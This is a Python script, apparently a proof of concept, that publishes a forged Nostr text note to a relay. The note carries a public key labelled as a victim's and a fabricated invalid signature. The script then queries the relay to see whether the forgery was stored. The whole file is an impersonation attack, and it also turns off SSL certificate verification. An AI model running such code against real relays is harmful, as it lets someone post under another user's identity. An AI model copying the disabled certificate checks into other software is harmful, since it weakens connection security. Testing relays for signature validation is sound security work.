import sys,os
import random,string,json,base64
sys.path.append(os.path.join(os.path.dirname(__file__), './python-nostr/'))
from nostr.event import Event, EventKind, EncryptedDirectMessage
from nostr.relay_manager import RelayManager
from nostr.key import PrivateKey, PublicKey
from nostr.filter import Filter, Filters
from nostr.message_type import ClientMessageType

import time, ssl

relay_manager = RelayManager()
relay_manager.add_relay("wss://relay.example.com")
relay_manager.open_connections({"cert_reqs": ssl.CERT_NONE}) # NOTE: This disables ssl certificate verification

published_event_ids = list()

# create invalid event without private key
note = Event(
  content="Fake post!123abcdefgxyz",
)
note.kind = EventKind.TEXT_NOTE
PUBKEY_VICTIM = 'npub1skynj8ynlun85jm95auypqw7w92saw4mlsyesstac2s2q32cuuss958de4'
note.public_key = PublicKey.from_npub(PUBKEY_VICTIM).hex()

# add invalid sig
note.signature = '56cbf291033215020feb533e2898c1634d7a8a2699f06533c73b2bcda6ff86f4c7e0363e5e6d45e68fa54736125c6505c46bcc3943e69a40f110005f6e639da8'

relay_manager.publish_event(note)

filters = Filters([Filter(authors=[note.public_key], kinds=[EventKind.TEXT_NOTE])])
subscription_id = "".join(random.choices(string.ascii_lowercase, k=64))
request = [ClientMessageType.REQUEST, subscription_id]
request.extend(filters.to_json_array())
relay_manager.add_subscription(subscription_id, filters)

message = json.dumps(request)
relay_manager.publish_message(message)
time.sleep(1) # allow the messages to send

while relay_manager.message_pool.has_events():
  event_msg = relay_manager.message_pool.get_event()
  #print(event_msg)
  #print(event_msg.event.id)
  published_event_ids.append(event_msg.event.id)


#print("---")
#print(dm.id)
#print(published_event_ids)
#print(dm.id in published_event_ids)

relay_manager.close_connections()
